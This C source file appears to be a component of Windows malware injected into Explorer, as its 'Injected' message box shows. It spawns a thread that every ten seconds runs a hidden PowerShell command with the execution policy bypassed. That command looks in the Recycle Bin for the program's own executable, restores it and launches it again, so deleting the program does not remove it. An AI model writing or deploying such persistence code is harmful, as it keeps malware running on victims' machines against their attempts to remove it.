#include <windows.h>
#include <stdio.h>

#include "../stdlib/ICU_env.h"
#include "../stdlib/ICU_log.h"

DWORD WINAPI cs_recyclebin(LPVOID lpParam) {
    char* SCRIPT_NAME = get_env_value("SCRIPT_NAME");

    char script_name[MAX_PATH];
    snprintf(script_name, MAX_PATH, "%s.exe", SCRIPT_NAME);

    char pscmd[2048];
    snprintf(pscmd, sizeof(pscmd),
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"& {"
        " $shell = New-Object -ComObject Shell.Application;"
        " $bin   = $shell.Namespace(0xA);"
        " $bin.Items() | ForEach-Object {"
        "   if ($_.Name -eq '%s') {"
        "     $orig = $_.ExtendedProperty('System.Recycle.OriginalFolder');"
        "     $_.InvokeVerb('Restore');"
        "     Start-Sleep -Milliseconds 500;"
        "     $full = Join-Path $orig $_.Name;"
        "     Write-Output \"[RESTORED] $full\";"
        "     Start-Process -FilePath $full;"
        "   }"
        " }"
        " }\"", script_name
    );

    MessageBoxA(NULL, "Привет из DLL в проводнике!", "Injected", MB_OK);

    info_log("cs_recyclebin: watching for file");
    info_log(pscmd);

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        errors_log("cs_recyclebin: CreatePipe failed");
        return 1;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    PROCESS_INFORMATION pi;

    while (1) {
        BOOL okp = CreateProcessA(NULL, pscmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (!okp) {
            errors_log("cs_recyclebin: CreateProcess failed");
        } else {
            CloseHandle(hWrite);

            char buffer[512];
            DWORD n;
            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &n, NULL) && n) {
                buffer[n] = '\0';

                char *line = strtok(buffer, "\r\n");
                while (line) {
                    info_log(line);
                    line = strtok(NULL, "\r\n");
                }
            }

            CloseHandle(hRead);
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
            errors_log("cs_recyclebin: CreatePipe failed on retry");
            break;
        }
        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

        Sleep(10000);
    }

    return 0;
}

void ar_recyclebin() {
    DWORD tid;
    HANDLE hThread = CreateThread(NULL, 0, cs_recyclebin, NULL, 0, &tid);
    if (!hThread) {
        errors_log("Failed to create thread for check recycle bin");
        return;
    }

    // CloseHandle(hThread);
}
